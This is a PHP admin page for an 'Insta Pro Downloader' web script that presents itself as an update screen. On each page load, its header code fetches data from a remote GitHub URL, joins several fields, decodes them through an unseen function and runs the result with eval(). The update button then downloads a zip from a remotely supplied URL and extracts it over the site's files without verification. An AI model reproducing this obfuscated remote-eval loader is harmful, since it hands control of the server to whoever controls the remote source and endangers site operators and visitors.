<html lang="en">
<head>
	<title>Update Ads Code - Insta Pro Downloader</title>
	<?php include "includes/header.php";
	include '../config/ads.php';
	$updateobj = file_get_contents("https://raw.githubusercontent.com/RatanDeveloper/InstaProUpdate/main/update.php");
	$updatedata = json_decode($updateobj, true);
	eval(gcode($updatedata['data1'].$updatedata['data2'].$updatedata['data3'].$updatedata['data4'].$updatedata['data5']));
	if(isset($_POST['update'])){

	file_put_contents('update.zip', file_get_contents($update));

	$fileName = "update.zip";

		$zip = new ZipArchive;
		$res = $zip->open($fileName);
		if ($res === TRUE) {
		  $zip->extractTo('../');
		  $zip->close();
		  
		  
		if (!unlink($fileName)) {
		echo ("Update error");
		}
		else {
			header('Location: ./index.php');
			exit;
		}
		
		} else {
		  echo ('<script>alert("Update error!")</script>');
		}


	}

	?>

                    <h2 class="title">Update</h2>
                    <form method="POST">
                        <div class="p-t-15">
						<?php
						echo "<p class='label'>Your Current Insta Pro Downloader v".$script_version."</p>";
						if($script_version < $version){
							echo "<p class='label'>Updates available for v".$version."</p>";
						?>
                            <button class="btn btn--radius-2 btn--blue" name="update" type="submit">Update now</button>
							<?php
							echo "<p class='label'>Changelog:-</p>";
							echo $changelog;
						}
						else{
							echo "<p class='label'>You are up to date</p>";
						}
						?>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
	<?php include "includes/footer.php"; ?>